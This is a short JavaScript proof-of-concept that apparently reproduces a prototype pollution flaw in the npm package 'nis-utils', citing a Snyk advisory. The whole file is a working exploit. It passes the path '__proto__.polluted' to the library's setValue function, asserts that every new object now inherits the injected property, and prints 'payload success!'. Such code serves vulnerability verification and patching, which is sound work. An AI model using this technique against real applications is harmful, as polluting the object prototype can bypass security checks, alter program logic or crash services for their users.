//https://snyk.io/vuln/SNYK-JS-NISUTILS-598799

const nisUtils = require('nis-utils'); 
const assert = require('assert');
var obj = {}
console.log("Before : " + obj.polluted);
nisUtils.object.setValue({}, '__proto__.polluted', "yes"); 
console.log("After : " +{}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");